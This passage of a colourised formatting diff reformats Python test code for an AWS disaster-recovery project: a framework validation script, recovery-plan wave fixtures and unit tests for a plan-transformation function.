required_files:\n         if Path(file_path).exists():\n             print(f\"   \u2705 {file_path}\")\n         else:\n             print(f\"   \u274c {file_path} (missing)\")\n             all_files_exist = False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     if not all_files_exist:\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     # Check Python dependencies\n     try:\n         import boto3\n         import requests\n         import jwt\n\u001b[32m+\u001b[0m\n         print(\"\\n\ud83d\udce6 Dependencies:\")\n         print(\"   \u2705 boto3\")\n         print(\"   \u2705 requests\")\n         print(\"   \u2705 PyJWT\")\n     except ImportError as e:\n         print(f\"\\n\u274c Missing Python dependency: {str(e)}\")\n         print(\"   Run: pip install -r requirements.txt\")\n         return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     print(\"\\n\" + \"=\" * 60)\n     print(\"\ud83c\udfaf VALIDATION COMPLETE!\")\n     print(\"\u2705 Framework is ready to run comprehensive RBAC security tests\")\n     print(\"\\nNext Steps:\")\n     print(\"1. Run security tests: python run_security_tests.py\")\n     print(\"2. Or use shell script: ../../scripts/run-security-tests.sh\")\n     print(\"3. Check reports in: reports/ directory\")\n     print(\"=\" * 60)\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return True\n\u001b[32m+\u001b[0m\n \n def main():\n     \"\"\"Main execution function\"\"\"\n     if validate_configuration():\n         print(\"\\n\ud83d\ude80 Ready to execute security tests!\")\n         return 0\n     else:\n         print(\"\\n\u274c Framework validation failed. Please fix issues above.\")\n         return 1\n \n\u001b[32m+\u001b[0m\n if __name__ == \"__main__\":\n\u001b[31m-    sys.exit(main())\u001b[0m\n\\ No newline at end of file\n\u001b[32m+    sys.exit(main())\u001b[0m\n\u001b[1m--- tests/python/fixtures/recovery_plan_fixtures.py\t2025-11-19 23:01:55.326276+00:00\u001b[0m\n\u001b[1m+++ tests/python/fixtures/recovery_plan_fixtures.py\t2026-01-02 15:49:03.645364+00:00\u001b[0m\n\u001b[36m@@ -5,17 +5,16 @@\u001b[0m\n import time\n from typing import Dict, List, Any\n \n \n def create_single_wave_plan(\n\u001b[31m-    plan_id: str = \"test-plan-001\",\u001b[0m\n\u001b[31m-    server_ids: List[str] = None\u001b[0m\n\u001b[32m+    plan_id: str = \"test-plan-001\", server_ids: List[str] = None\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"Create a simple recovery plan with one wave.\"\"\"\n     if server_ids is None:\n         server_ids = [\"s-test001\", \"s-test002\"]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return {\n         \"PlanId\": plan_id,\n         \"PlanName\": \"Single Wave Test Plan\",\n         \"Description\": \"Simple plan with one wave for testing\",\n         \"AccountId\": \"123456789012\",\n\u001b[36m@@ -30,21 +29,20 @@\u001b[0m\n                 \"WaveDescription\": \"Primary database servers\",\n                 \"ServerIds\": server_ids,\n                 \"ExecutionType\": \"SEQUENTIAL\",\n                 \"ExecutionOrder\": list(range(1, len(server_ids) + 1)),\n                 \"Dependencies\": [],\n\u001b[31m-                \"WaitTimeSeconds\": 0\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 0,\u001b[0m\n             }\n         ],\n         \"CreatedDate\": int(time.time()),\n\u001b[31m-        \"LastModifiedDate\": int(time.time())\u001b[0m\n\u001b[32m+        \"LastModifiedDate\": int(time.time()),\u001b[0m\n     }\n \n \n def create_three_wave_plan(\n\u001b[31m-    plan_id: str = \"test-plan-003\",\u001b[0m\n\u001b[31m-    servers_per_wave: int = 2\u001b[0m\n\u001b[32m+    plan_id: str = \"test-plan-003\", servers_per_wave: int = 2\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"Create a recovery plan with 3 sequential waves with dependencies.\"\"\"\n     return {\n         \"PlanId\": plan_id,\n         \"PlanName\": \"Three Tier Application\",\n\u001b[36m@@ -57,45 +55,50 @@\u001b[0m\n         \"Waves\": [\n             {\n                 \"WaveNumber\": 1,\n                 \"WaveName\": \"Database Tier\",\n                 \"WaveDescription\": \"Database servers\",\n\u001b[31m-                \"ServerIds\": [f\"s-db{i:03d}\" for i in range(1, servers_per_wave + 1)],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    f\"s-db{i:03d}\" for i in range(1, servers_per_wave + 1)\u001b[0m\n\u001b[32m+                ],\u001b[0m\n                 \"ExecutionType\": \"SEQUENTIAL\",\n                 \"ExecutionOrder\": list(range(1, servers_per_wave + 1)),\n                 \"Dependencies\": [],\n\u001b[31m-                \"WaitTimeSeconds\": 60\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 60,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 2,\n                 \"WaveName\": \"Application Tier\",\n                 \"WaveDescription\": \"Application servers\",\n\u001b[31m-                \"ServerIds\": [f\"s-app{i:03d}\" for i in range(1, servers_per_wave + 1)],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    f\"s-app{i:03d}\" for i in range(1, servers_per_wave + 1)\u001b[0m\n\u001b[32m+                ],\u001b[0m\n                 \"ExecutionType\": \"PARALLEL\",\n                 \"ExecutionOrder\": [1] * servers_per_wave,\n                 \"Dependencies\": [\"Wave-1\"],\n\u001b[31m-                \"WaitTimeSeconds\": 30\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 30,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 3,\n                 \"WaveName\": \"Web Tier\",\n                 \"WaveDescription\": \"Web servers\",\n\u001b[31m-                \"ServerIds\": [f\"s-web{i:03d}\" for i in range(1, servers_per_wave + 1)],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    f\"s-web{i:03d}\" for i in range(1, servers_per_wave + 1)\u001b[0m\n\u001b[32m+                ],\u001b[0m\n                 \"ExecutionType\": \"PARALLEL\",\n                 \"ExecutionOrder\": [1] * servers_per_wave,\n                 \"Dependencies\": [\"Wave-2\"],\n\u001b[31m-                \"WaitTimeSeconds\": 0\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        ],\u001b[0m\n\u001b[31m-        \"CreatedDate\": int(time.time()),\u001b[0m\n\u001b[31m-        \"LastModifiedDate\": int(time.time())\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 0,\u001b[0m\n\u001b[32m+            },\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+        \"CreatedDate\": int(time.time()),\u001b[0m\n\u001b[32m+        \"LastModifiedDate\": int(time.time()),\u001b[0m\n     }\n \n \n def create_parallel_wave_plan(\n\u001b[31m-    plan_id: str = \"test-plan-parallel\",\u001b[0m\n\u001b[31m-    server_count: int = 4\u001b[0m\n\u001b[32m+    plan_id: str = \"test-plan-parallel\", server_count: int = 4\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"Create a recovery plan with parallel execution.\"\"\"\n     return {\n         \"PlanId\": plan_id,\n         \"PlanName\": \"Parallel Execution Test Plan\",\n\u001b[36m@@ -108,25 +111,26 @@\u001b[0m\n         \"Waves\": [\n             {\n                 \"WaveNumber\": 1,\n                 \"WaveName\": \"Parallel Wave\",\n                 \"WaveDescription\": \"All servers launch simultaneously\",\n\u001b[31m-                \"ServerIds\": [f\"s-par{i:03d}\" for i in range(1, server_count + 1)],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    f\"s-par{i:03d}\" for i in range(1, server_count + 1)\u001b[0m\n\u001b[32m+                ],\u001b[0m\n                 \"ExecutionType\": \"PARALLEL\",\n                 \"ExecutionOrder\": [1] * server_count,\n                 \"Dependencies\": [],\n\u001b[31m-                \"WaitTimeSeconds\": 0\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 0,\u001b[0m\n             }\n         ],\n         \"CreatedDate\": int(time.time()),\n\u001b[31m-        \"LastModifiedDate\": int(time.time())\u001b[0m\n\u001b[32m+        \"LastModifiedDate\": int(time.time()),\u001b[0m\n     }\n \n \n def create_five_wave_plan(\n\u001b[31m-    plan_id: str = \"test-plan-005\",\u001b[0m\n\u001b[31m-    servers_per_wave: int = 2\u001b[0m\n\u001b[32m+    plan_id: str = \"test-plan-005\", servers_per_wave: int = 2\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"Create a recovery plan with 5 waves for complex dependency testing.\"\"\"\n     return {\n         \"PlanId\": plan_id,\n         \"PlanName\": \"Five Wave Complex Plan\",\n\u001b[36m@@ -139,64 +143,74 @@\u001b[0m\n         \"Waves\": [\n             {\n                 \"WaveNumber\": 1,\n                 \"WaveName\": \"Foundation\",\n                 \"WaveDescription\": \"Core infrastructure\",\n\u001b[31m-                \"ServerIds\": [f\"s-fnd{i:03d}\" for i in range(1, servers_per_wave + 1)],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    f\"s-fnd{i:03d}\" for i in range(1, servers_per_wave + 1)\u001b[0m\n\u001b[32m+                ],\u001b[0m\n                 \"ExecutionType\": \"SEQUENTIAL\",\n                 \"ExecutionOrder\": list(range(1, servers_per_wave + 1)),\n                 \"Dependencies\": [],\n\u001b[31m-                \"WaitTimeSeconds\": 30\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 30,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 2,\n                 \"WaveName\": \"Database\",\n                 \"WaveDescription\": \"Database tier\",\n\u001b[31m-                \"ServerIds\": [f\"s-db{i:03d}\" for i in range(1, servers_per_wave + 1)],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    f\"s-db{i:03d}\" for i in range(1, servers_per_wave + 1)\u001b[0m\n\u001b[32m+                ],\u001b[0m\n                 \"ExecutionType\": \"SEQUENTIAL\",\n                 \"ExecutionOrder\": list(range(1, servers_per_wave + 1)),\n                 \"Dependencies\": [\"Wave-1\"],\n\u001b[31m-                \"WaitTimeSeconds\": 60\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 60,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 3,\n                 \"WaveName\": \"Application\",\n                 \"WaveDescription\": \"Application tier\",\n\u001b[31m-                \"ServerIds\": [f\"s-app{i:03d}\" for i in range(1, servers_per_wave + 1)],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    f\"s-app{i:03d}\" for i in range(1, servers_per_wave + 1)\u001b[0m\n\u001b[32m+                ],\u001b[0m\n                 \"ExecutionType\": \"PARALLEL\",\n                 \"ExecutionOrder\": [1] * servers_per_wave,\n                 \"Dependencies\": [\"Wave-2\"],\n\u001b[31m-                \"WaitTimeSeconds\": 45\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 45,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 4,\n                 \"WaveName\": \"Web\",\n                 \"WaveDescription\": \"Web tier\",\n\u001b[31m-                \"ServerIds\": [f\"s-web{i:03d}\" for i in range(1, servers_per_wave + 1)],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    f\"s-web{i:03d}\" for i in range(1, servers_per_wave + 1)\u001b[0m\n\u001b[32m+                ],\u001b[0m\n                 \"ExecutionType\": \"PARALLEL\",\n                 \"ExecutionOrder\": [1] * servers_per_wave,\n                 \"Dependencies\": [\"Wave-3\"],\n\u001b[31m-                \"WaitTimeSeconds\": 30\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 30,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 5,\n                 \"WaveName\": \"Edge\",\n                 \"WaveDescription\": \"Edge services and CDN\",\n\u001b[31m-                \"ServerIds\": [f\"s-edg{i:03d}\" for i in range(1, servers_per_wave + 1)],\u001b[0m\n\u001b[32m+                \"ServerIds\": [\u001b[0m\n\u001b[32m+                    f\"s-edg{i:03d}\" for i in range(1, servers_per_wave + 1)\u001b[0m\n\u001b[32m+                ],\u001b[0m\n                 \"ExecutionType\": \"PARALLEL\",\n                 \"ExecutionOrder\": [1] * servers_per_wave,\n                 \"Dependencies\": [\"Wave-4\"],\n\u001b[31m-                \"WaitTimeSeconds\": 0\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        ],\u001b[0m\n\u001b[31m-        \"CreatedDate\": int(time.time()),\u001b[0m\n\u001b[31m-        \"LastModifiedDate\": int(time.time())\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 0,\u001b[0m\n\u001b[32m+            },\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+        \"CreatedDate\": int(time.time()),\u001b[0m\n\u001b[32m+        \"LastModifiedDate\": int(time.time()),\u001b[0m\n     }\n \n \n def create_mixed_execution_plan(\n\u001b[31m-    plan_id: str = \"test-plan-mixed\"\u001b[0m\n\u001b[32m+    plan_id: str = \"test-plan-mixed\",\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"Create a plan with mixed sequential and parallel execution types.\"\"\"\n     return {\n         \"PlanId\": plan_id,\n         \"PlanName\": \"Mixed Execution Plan\",\n\u001b[36m@@ -213,30 +227,30 @@\u001b[0m\n                 \"WaveDescription\": \"Servers launch one at a time\",\n                 \"ServerIds\": [\"s-seq001\", \"s-seq002\", \"s-seq003\"],\n                 \"ExecutionType\": \"SEQUENTIAL\",\n                 \"ExecutionOrder\": [1, 2, 3],\n                 \"Dependencies\": [],\n\u001b[31m-                \"WaitTimeSeconds\": 30\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 30,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 2,\n                 \"WaveName\": \"Parallel Wave\",\n                 \"WaveDescription\": \"Servers launch simultaneously\",\n                 \"ServerIds\": [\"s-par001\", \"s-par002\", \"s-par003\"],\n                 \"ExecutionType\": \"PARALLEL\",\n                 \"ExecutionOrder\": [1, 1, 1],\n                 \"Dependencies\": [\"Wave-1\"],\n\u001b[31m-                \"WaitTimeSeconds\": 0\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        ],\u001b[0m\n\u001b[31m-        \"CreatedDate\": int(time.time()),\u001b[0m\n\u001b[31m-        \"LastModifiedDate\": int(time.time())\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 0,\u001b[0m\n\u001b[32m+            },\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+        \"CreatedDate\": int(time.time()),\u001b[0m\n\u001b[32m+        \"LastModifiedDate\": int(time.time()),\u001b[0m\n     }\n \n \n def create_plan_with_transitive_dependencies(\n\u001b[31m-    plan_id: str = \"test-plan-transitive\"\u001b[0m\n\u001b[32m+    plan_id: str = \"test-plan-transitive\",\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"Create a plan with transitive dependencies (Wave 3 -> Wave 2 -> Wave 1).\"\"\"\n     return {\n         \"PlanId\": plan_id,\n         \"PlanName\": \"Transitive Dependencies Plan\",\n\u001b[36m@@ -253,46 +267,45 @@\u001b[0m\n                 \"WaveDescription\": \"Base infrastructure\",\n                 \"ServerIds\": [\"s-base001\"],\n                 \"ExecutionType\": \"SEQUENTIAL\",\n                 \"ExecutionOrder\": [1],\n                 \"Dependencies\": [],\n\u001b[31m-                \"WaitTimeSeconds\": 0\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 0,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 2,\n                 \"WaveName\": \"Middle\",\n                 \"WaveDescription\": \"Middle tier depends on base\",\n                 \"ServerIds\": [\"s-mid001\"],\n                 \"ExecutionType\": \"SEQUENTIAL\",\n                 \"ExecutionOrder\": [1],\n                 \"Dependencies\": [\"Wave-1\"],\n\u001b[31m-                \"WaitTimeSeconds\": 0\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 0,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 3,\n                 \"WaveName\": \"Top\",\n                 \"WaveDescription\": \"Top tier depends on middle (transitive to base)\",\n                 \"ServerIds\": [\"s-top001\"],\n                 \"ExecutionType\": \"SEQUENTIAL\",\n                 \"ExecutionOrder\": [1],\n                 \"Dependencies\": [\"Wave-2\"],\n\u001b[31m-                \"WaitTimeSeconds\": 0\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        ],\u001b[0m\n\u001b[31m-        \"CreatedDate\": int(time.time()),\u001b[0m\n\u001b[31m-        \"LastModifiedDate\": int(time.time())\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 0,\u001b[0m\n\u001b[32m+            },\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+        \"CreatedDate\": int(time.time()),\u001b[0m\n\u001b[32m+        \"LastModifiedDate\": int(time.time()),\u001b[0m\n     }\n \n \n def create_plan_with_wait_times(\n\u001b[31m-    plan_id: str = \"test-plan-waits\",\u001b[0m\n\u001b[31m-    wait_times: List[int] = None\u001b[0m\n\u001b[32m+    plan_id: str = \"test-plan-waits\", wait_times: List[int] = None\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"Create a plan with configurable wait times between waves.\"\"\"\n     if wait_times is None:\n         wait_times = [60, 120, 180]\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     return {\n         \"PlanId\": plan_id,\n         \"PlanName\": \"Wait Time Test Plan\",\n         \"Description\": \"Plan for testing wait time compliance\",\n         \"AccountId\": \"123456789012\",\n\u001b[36m@@ -307,21 +320,21 @@\u001b[0m\n                 \"WaveDescription\": f\"Wave with {wait_time}s wait\",\n                 \"ServerIds\": [f\"s-wait{i+1:03d}\"],\n                 \"ExecutionType\": \"SEQUENTIAL\",\n                 \"ExecutionOrder\": [1],\n                 \"Dependencies\": [f\"Wave-{i}\"] if i > 0 else [],\n\u001b[31m-                \"WaitTimeSeconds\": wait_time\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": wait_time,\u001b[0m\n             }\n             for i, wait_time in enumerate(wait_times)\n         ],\n         \"CreatedDate\": int(time.time()),\n\u001b[31m-        \"LastModifiedDate\": int(time.time())\u001b[0m\n\u001b[32m+        \"LastModifiedDate\": int(time.time()),\u001b[0m\n     }\n \n \n def create_real_drs_server_plan(\n\u001b[31m-    plan_id: str = \"test-plan-real-drs\"\u001b[0m\n\u001b[32m+    plan_id: str = \"test-plan-real-drs\",\u001b[0m\n ) -> Dict[str, Any]:\n     \"\"\"Create a plan using real DRS server IDs from TEST account.\"\"\"\n     return {\n         \"PlanId\": plan_id,\n         \"PlanName\": \"Real DRS Servers Plan\",\n\u001b[36m@@ -338,35 +351,35 @@\u001b[0m\n                 \"WaveDescription\": \"Real database servers\",\n                 \"ServerIds\": [\"s-3d75cdc0d9a28a725\", \"s-3afa164776f93ce4f\"],\n                 \"ExecutionType\": \"SEQUENTIAL\",\n                 \"ExecutionOrder\": [1, 2],\n                 \"Dependencies\": [],\n\u001b[31m-                \"WaitTimeSeconds\": 60\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 60,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 2,\n                 \"WaveName\": \"Application Tier\",\n                 \"WaveDescription\": \"Real application servers\",\n                 \"ServerIds\": [\"s-3c1730a9e0771ea14\", \"s-3c63bb8be30d7d071\"],\n                 \"ExecutionType\": \"PARALLEL\",\n                 \"ExecutionOrder\": [1, 1],\n                 \"Dependencies\": [\"Wave-1\"],\n\u001b[31m-                \"WaitTimeSeconds\": 30\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 30,\u001b[0m\n             },\n             {\n                 \"WaveNumber\": 3,\n                 \"WaveName\": \"Web Tier\",\n                 \"WaveDescription\": \"Real web servers\",\n                 \"ServerIds\": [\"s-3578f52ef3bdd58b4\", \"s-3b9401c1cd270a7a8\"],\n                 \"ExecutionType\": \"PARALLEL\",\n                 \"ExecutionOrder\": [1, 1],\n                 \"Dependencies\": [\"Wave-2\"],\n\u001b[31m-                \"WaitTimeSeconds\": 0\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[31m-        ],\u001b[0m\n\u001b[31m-        \"CreatedDate\": int(time.time()),\u001b[0m\n\u001b[31m-        \"LastModifiedDate\": int(time.time())\u001b[0m\n\u001b[32m+                \"WaitTimeSeconds\": 0,\u001b[0m\n\u001b[32m+            },\u001b[0m\n\u001b[32m+        ],\u001b[0m\n\u001b[32m+        \"CreatedDate\": int(time.time()),\u001b[0m\n\u001b[32m+        \"LastModifiedDate\": int(time.time()),\u001b[0m\n     }\n \n \n # Convenience functions for common test scenarios\n def get_all_fixtures() -> Dict[str, Dict[str, Any]]:\n\u001b[36m@@ -377,11 +390,11 @@\u001b[0m\n         \"five_wave\": create_five_wave_plan(),\n         \"parallel\": create_parallel_wave_plan(),\n         \"mixed\": create_mixed_execution_plan(),\n         \"transitive\": create_plan_with_transitive_dependencies(),\n         \"wait_times\": create_plan_with_wait_times(),\n\u001b[31m-        \"real_drs\": create_real_drs_server_plan()\u001b[0m\n\u001b[32m+        \"real_drs\": create_real_drs_server_plan(),\u001b[0m\n     }\n \n \n def get_fixture(name: str, **kwargs) -> Dict[str, Any]:\n     \"\"\"Get a fixture by name with optional parameters.\"\"\"\n\u001b[36m@@ -391,11 +404,13 @@\u001b[0m\n         \"five_wave\": create_five_wave_plan,\n         \"parallel\": create_parallel_wave_plan,\n         \"mixed\": create_mixed_execution_plan,\n         \"transitive\": create_plan_with_transitive_dependencies,\n         \"wait_times\": create_plan_with_wait_times,\n\u001b[31m-        \"real_drs\": create_real_drs_server_plan\u001b[0m\n\u001b[31m-    }\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        \"real_drs\": create_real_drs_server_plan,\u001b[0m\n\u001b[32m+    }\u001b[0m\n\u001b[32m+\u001b[0m\n     if name not in fixtures:\n\u001b[31m-        raise ValueError(f\"Unknown fixture: {name}. Available: {list(fixtures.keys())}\")\u001b[0m\n\u001b[32m+        raise ValueError(\u001b[0m\n\u001b[32m+            f\"Unknown fixture: {name}. Available: {list(fixtures.keys())}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n     return fixtures[name](**kwargs)\n\u001b[1m--- tests/python/unit/test_wave_transformation.py\t2025-11-20 01:33:36.092198+00:00\u001b[0m\n\u001b[1m+++ tests/python/unit/test_wave_transformation.py\t2026-01-02 15:49:03.654556+00:00\u001b[0m\n\u001b[36m@@ -12,305 +12,319 @@\u001b[0m\n os.environ[\"AWS_ACCESS_KEY_ID\"] = \"testing\"\n os.environ[\"AWS_SECRET_ACCESS_KEY\"] = \"testing\"\n os.environ[\"PROTECTION_GROUPS_TABLE\"] = \"protection-groups-test\"\n os.environ[\"RECOVERY_PLANS_TABLE\"] = \"recovery-plans-test\"\n os.environ[\"EXECUTION_HISTORY_TABLE\"] = \"execution-history-test\"\n\u001b[31m-os.environ[\"STATE_MACHINE_ARN\"] = \"arn:aws:states:us-east-1:123456789012:stateMachine:test\"\u001b[0m\n\u001b[32m+os.environ[\u001b[0m\n\u001b[32m+    \"STATE_MACHINE_ARN\"\u001b[0m\n\u001b[32m+] = \"arn:aws:states:us-east-1:123456789012:stateMachine:test\"\u001b[0m\n \n # Add lambda directory to path\n\u001b[31m-sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..', 'lambda'))\u001b[0m\n\u001b[32m+sys.path.insert(\u001b[0m\n\u001b[32m+    0, os.path.join(os.path.dirname(__file__), \"..\", \"..\", \"..\", \"lambda\")\u001b[0m\n\u001b[32m+)\u001b[0m\n \n from index import transform_rp_to_camelcase\n \n \n class TestWaveTransformation:\n     \"\"\"Test wave data transformation logic with defensive ServerIds handling\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_transform_with_valid_server_ids_list(self):\n         \"\"\"Test transformation with properly formatted ServerIds as list\"\"\"\n         rp = {\n\u001b[31m-            'PlanId': 'plan-123',\u001b[0m\n\u001b[31m-            'PlanName': 'Test Plan',\u001b[0m\n\u001b[31m-            'Description': 'Test Description',\u001b[0m\n\u001b[31m-            'AccountId': '123456789012',\u001b[0m\n\u001b[31m-            'Region': 'us-east-1',\u001b[0m\n\u001b[31m-            'Owner': 'testuser',\u001b[0m\n\u001b[31m-            'RPO': 60,\u001b[0m\n\u001b[31m-            'RTO': 120,\u001b[0m\n\u001b[31m-            'Waves': [{\u001b[0m\n\u001b[31m-                'WaveId': 'wave-0',\u001b[0m\n\u001b[31m-                'WaveName': 'Wave 1',\u001b[0m\n\u001b[31m-                'WaveDescription': 'First wave',\u001b[0m\n\u001b[31m-                'ServerIds': ['s-123', 's-456'],  # List format - correct\u001b[0m\n\u001b[31m-                'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                'Dependencies': []\u001b[0m\n\u001b[31m-            }],\u001b[0m\n\u001b[31m-            'CreatedDate': 1700000000,\u001b[0m\n\u001b[31m-            'LastModifiedDate': 1700000000\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['id'] == 'plan-123'\u001b[0m\n\u001b[31m-        assert result['name'] == 'Test Plan'\u001b[0m\n\u001b[31m-        assert len(result['waves']) == 1\u001b[0m\n\u001b[31m-        assert result['waves'][0]['serverIds'] == ['s-123', 's-456']\u001b[0m\n\u001b[31m-        assert isinstance(result['waves'][0]['serverIds'], list)\u001b[0m\n\u001b[31m-        assert result['waves'][0]['protectionGroupId'] == 'pg-789'\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+            \"PlanId\": \"plan-123\",\u001b[0m\n\u001b[32m+            \"PlanName\": \"Test Plan\",\u001b[0m\n\u001b[32m+            \"Description\": \"Test Description\",\u001b[0m\n\u001b[32m+            \"AccountId\": \"123456789012\",\u001b[0m\n\u001b[32m+            \"Region\": \"us-east-1\",\u001b[0m\n\u001b[32m+            \"Owner\": \"testuser\",\u001b[0m\n\u001b[32m+            \"RPO\": 60,\u001b[0m\n\u001b[32m+            \"RTO\": 120,\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveId\": \"wave-0\",\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 1\",\u001b[0m\n\u001b[32m+                    \"WaveDescription\": \"First wave\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [\"s-123\", \"s-456\"],  # List format - correct\u001b[0m\n\u001b[32m+                    \"ProtectionGroupId\": \"pg-789\",\u001b[0m\n\u001b[32m+                    \"ExecutionType\": \"sequential\",\u001b[0m\n\u001b[32m+                    \"Dependencies\": [],\u001b[0m\n\u001b[32m+                }\u001b[0m\n\u001b[32m+            ],\u001b[0m\n\u001b[32m+            \"CreatedDate\": 1700000000,\u001b[0m\n\u001b[32m+            \"LastModifiedDate\": 1700000000,\u001b[0m\n\u001b[32m+        }\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"id\"] == \"plan-123\"\u001b[0m\n\u001b[32m+        assert result[\"name\"] == \"Test Plan\"\u001b[0m\n\u001b[32m+        assert len(result[\"waves\"]) == 1\u001b[0m\n\u001b[32m+        assert result[\"waves\"][0][\"serverIds\"] == [\"s-123\", \"s-456\"]\u001b[0m\n\u001b[32m+        assert isinstance(result[\"waves\"][0][\"serverIds\"], list)\u001b[0m\n\u001b[32m+        assert result[\"waves\"][0][\"protectionGroupId\"] == \"pg-789\"\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_transform_with_string_server_ids(self):\n         \"\"\"Test recovery from string ServerIds (boto3 deserialization edge case)\"\"\"\n         rp = {\n\u001b[31m-            'PlanId': 'plan-456',\u001b[0m\n\u001b[31m-            'PlanName': 'Edge Case Plan',\u001b[0m\n\u001b[31m-            'Description': 'Test',\u001b[0m\n\u001b[31m-            'AccountId': '123456789012',\u001b[0m\n\u001b[31m-            'Region': 'us-east-1',\u001b[0m\n\u001b[31m-            'Owner': 'testuser',\u001b[0m\n\u001b[31m-            'RPO': 60,\u001b[0m\n\u001b[31m-            'RTO': 120,\u001b[0m\n\u001b[31m-            'Waves': [{\u001b[0m\n\u001b[31m-                'WaveId': 'wave-0',\u001b[0m\n\u001b[31m-                'WaveName': 'Wave 1',\u001b[0m\n\u001b[31m-                'ServerIds': 's-123',  # STRING instead of list - bug scenario\u001b[0m\n\u001b[31m-                'ProtectionGroupId': 'pg-789',\u001b[0m\n\u001b[31m-                'ExecutionType': 'sequential',\u001b[0m\n\u001b[31m-                'Dependencies': []\u001b[0m\n\u001b[31m-            }],\u001b[0m\n\u001b[31m-            'CreatedDate': 1700000000,\u001b[0m\n\u001b[31m-            'LastModifiedDate': 1700000000\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = transform_rp_to_camelcase(rp)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+            \"PlanId\": \"plan-456\",\u001b[0m\n\u001b[32m+            \"PlanName\": \"Edge Case Plan\",\u001b[0m\n\u001b[32m+            \"Description\": \"Test\",\u001b[0m\n\u001b[32m+            \"AccountId\": \"123456789012\",\u001b[0m\n\u001b[32m+            \"Region\": \"us-east-1\",\u001b[0m\n\u001b[32m+            \"Owner\": \"testuser\",\u001b[0m\n\u001b[32m+            \"RPO\": 60,\u001b[0m\n\u001b[32m+            \"RTO\": 120,\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    